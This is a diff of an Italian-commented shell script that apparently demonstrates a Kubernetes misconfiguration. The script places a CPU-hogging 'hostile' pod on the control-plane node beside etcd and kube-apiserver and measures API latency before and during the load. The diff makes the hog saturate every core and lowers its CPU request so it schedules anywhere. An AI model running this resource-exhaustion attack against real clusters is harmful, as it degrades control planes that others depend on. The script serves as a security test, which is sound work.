@@ -47,11 +47,13 @@ kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1;
 CP_NODE="$(kubectl get nodes -l "$CP_KEY" -o jsonpath='{.items[0].metadata.name}')"
 [ -n "$CP_NODE" ] || { echo "nessun nodo con l'etichetta $CP_KEY"; exit 1; }
 
-# latenza media dell'API server su N chiamate, in secondi (serve 'date +%s.%N')
+# latenza media dell'API server su N chiamate, in secondi (serve 'date +%s.%N').
+# Si legge una lista da etcd (i pod del namespace): è più sensibile alla
+# contesa di CPU di un semplice /readyz, che l'apiserver serve dalla cache.
 api_latency() {
   local n=8 start end
   start="$(date +%s.%N)"
-  for _ in $(seq 1 "$n"); do kubectl get --raw='/readyz' >/dev/null 2>&1 || true; done
+  for _ in $(seq 1 "$n"); do kubectl get --raw="/api/v1/namespaces/${NS}/pods?limit=100" >/dev/null 2>&1 || true; done
   end="$(date +%s.%N)"
   awk -v s="$start" -v e="$end" -v n="$n" 'BEGIN{printf "%.3f", (e-s)/n}'
 }
@@ -78,9 +80,10 @@ spec:
   - name: hog
     image: $BUSYBOX_IMAGE
     imagePullPolicy: IfNotPresent
-    command: ["sh","-c","for i in 1 2 3 4 5 6; do yes >/dev/null & done; wait"]
+    # un processo busy-loop per ogni core (x2): satura la CPU del nodo
+    command: ["sh","-c","n=\$(nproc 2>/dev/null || echo 4); i=0; while [ \$i -lt \$((n*2)) ]; do yes >/dev/null & i=\$((i+1)); done; wait"]
     resources:
-      requests: { cpu: "2", memory: 64Mi }   # chiede molta CPU: vince lo scheduling
+      requests: { cpu: 50m, memory: 32Mi }   # richiesta minima: si schedula ovunque
       limits:   { memory: 128Mi }            # nessun limite di CPU: brucia quanto puo'
 EOF
 }
@@ -112,27 +115,28 @@ trap cleanup EXIT
 # -----------------------------------------------------------------------------
 line "2. Latenza dell'API server PRIMA dell'attacco (baseline)"
 BEFORE="$(api_latency)"
-echo "   latenza media /readyz: ${BEFORE}s"
+echo "   latenza media API (lista pod): ${BEFORE}s"
 
 # -----------------------------------------------------------------------------
 line "3. ATTACCO: schedulo un pod ostile sul control plane e lo faccio competere"
 atk_manifest | kubectl apply -f -
 kubectl wait pod "$ATK_POD" -n "$NS" --for=condition=Ready --timeout=60s 2>/dev/null || true
 NODE="$(kubectl get pod "$ATK_POD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
-echo "   pod ostile schedulato su: ${NODE:-?}"
+echo "   pod ostile schedulato su: ${NODE:-Pending}"
 if [ "$NODE" = "$CP_NODE" ]; then
-  echo "   => il carico gira ACCANTO a etcd e kube-apiserver."
+  echo "   => ESITO PRINCIPALE: il carico ostile gira ACCANTO a etcd e kube-apiserver."
+  echo "      Questa co-locazione è ciò che la misconfig rende possibile (nessuna policy la vieta)."
 else
-  echo "   => non schedulato sul control plane (gia' mitigato?): ${NODE:-Pending}"
+  echo "   => non schedulato sul control plane (gia' mitigato, taint/policy, o nodo saturo?): ${NODE:-Pending}"
 fi
 
-line "4. Latenza dell'API server DURANTE l'attacco"
+line "4. Latenza dell'API server DURANTE l'attacco (impatto, secondario)"
 sleep 3   # lascio salire la contesa di CPU
 DURING="$(api_latency)"
-echo "   latenza media /readyz: ${DURING}s  (baseline ${BEFORE}s)"
+echo "   latenza media API (lista pod): ${DURING}s  (baseline ${BEFORE}s)"
 awk -v b="$BEFORE" -v d="$DURING" 'BEGIN{
-  if (b>0 && d>b*1.3) printf "   => DEGRADO misurabile: +%.0f%% di latenza sul control plane.\n",(d/b-1)*100;
-  else print "   => variazione contenuta in questa esecuzione (ritenta con ATTACK_SECS piu alto o piu CPU occupata).";
+  if (b>0 && d>b*1.3) printf "   => DEGRADO misurabile: +%.0f%% di latenza dell API durante il carico.\n",(d/b-1)*100;
+  else print "   => latenza stabile: su un nodo con core liberi e con la priorità (CPU shares) dei\n      componenti di sistema, l apiserver regge il picco. L esposizione resta la co-locazione:\n      un carico più pesante o prolungato (ATTACK_SECS maggiore) o un nodo più piccolo la rendono visibile.";
 }'
 echo "   eventi di pressione sul nodo (se presenti):"
 kubectl get events -A --field-selector involvedObject.name="$CP_NODE" 2>/dev/null \
